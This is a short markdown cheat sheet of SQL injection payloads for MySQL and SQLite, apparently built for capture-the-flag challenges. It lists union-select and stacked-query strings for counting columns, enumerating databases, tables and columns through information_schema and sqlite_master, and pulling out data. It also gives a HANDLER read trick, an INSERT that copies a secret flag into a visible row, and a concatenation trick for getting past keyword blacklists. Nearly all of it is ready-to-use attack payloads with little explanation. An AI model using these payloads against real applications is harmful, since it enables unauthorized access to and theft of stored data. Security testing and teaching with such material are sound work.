## MySQL

- Comment
  - `#`

- Extract number column

  - `'union select 1,2,3#`
  - `' order by 3#` 

- Confirming injection visible

  - `'union select @@version,2,3#`

- Extract database names

  - `';show databases;#`
  - `'union select group_concat(0x7c,schema_name,0x7c),2,3 from information_schema.schemata#`

- Extract table neams from database

  - `';show tables;#`
  - `'union select group_concat(0x7c,table_name,0x7c),2,3 from information_schema.tables where table_schema='<DATABASE_NAME>'#`

- Extract column names from table name
  
  ```
  ';show columns from <TABLE_NAME>;#
  ';show columns from `1919810931114514`;# if table name is number it must be queried with backtricks
  'union select group_concat(0x7c,column_name,0x7c),2,3 from information_schema.columns where table_name='<TABLE_NAME>'#
  ```

- Extract data

  - `'union select <COLUMN_NAME>,'b','c' from <DATABASE_NAME>.<TABLE_NAME> where id='1'#`

### Tricks

  - Read data from column name
    ```
    1'; handler <COLUMN_NAME> open as `a`; handler `a` read next;#
    ```


## SQLite
- Extract previous query
  - `union select sql from sqlite_master`

- Extract table names 
  - `union select name from sqlite_master where type='table'--`
  
- Extract column names from table name
  - `union select sql from sqlite_master where type='table' and name='<table_name>'--`
  
- Extract data using column and table name
  - `union select <column_name> from <table_name> where id=1--`

### Insert
  - `INSERT INTO notes(username, notes) VALUES('admin', (SELECT flag FROM secret LIMIT 0,1)); -- -`

### Tricks

  - Bypass blacklist words
    - `ad'||'min`

